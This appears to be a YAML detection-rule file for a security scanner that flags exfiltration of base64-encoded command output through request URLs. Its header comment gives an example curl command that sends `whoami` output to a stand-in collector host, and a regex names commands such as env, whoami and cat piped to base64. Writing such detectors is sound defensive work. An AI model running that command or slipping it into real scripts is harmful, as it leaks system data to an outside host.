# Command output exfiltrated through request-URL interpolation.
#
# A dynamic URL path is neutral: installers commonly select platform-specific
# artifacts this way. Pair it with output piped to Base64 to infer a transport
# chain such as `curl https://collector/id_$(whoami | base64 -w0)`.
defaults:
  platforms: [unix, windows]
  for: [shell, powershell]
  attack: T1041

traits:
  - id: pipe-group-base64-stdout
    desc: Command output piped to base64
    crit: notable
    conf: 0.85
    if:
      type: text
      regex: '(\}|\benv|\bset|\bid|\bwhoami|\bcat\b[^|]{0,80}|\bls\b[^|]{0,40})\s*\|\s*base64\b'
    not:
      - substr: "base64 -d"
      - substr: "base64 --decode"

composite_rules:
  - id: command-output-url-base64-exfil
    desc: Command output base64-wrapped into URL
    crit: hostile
    conf: 0.95
    all:
      - id: pipe-group-base64-stdout
    # Either spelling of "run a command and splice its output into the URL":
    # POSIX command substitution, or a PowerShell subexpression that invokes
    # something rather than reading a property.
    any:
      - id: micro-behaviors/communications/http/url/build::shell-command-substitution-url-path
      - id: micro-behaviors/communications/http/url/build::powershell-command-subexpression-url-path
    needs: 1
    near_bytes: 512
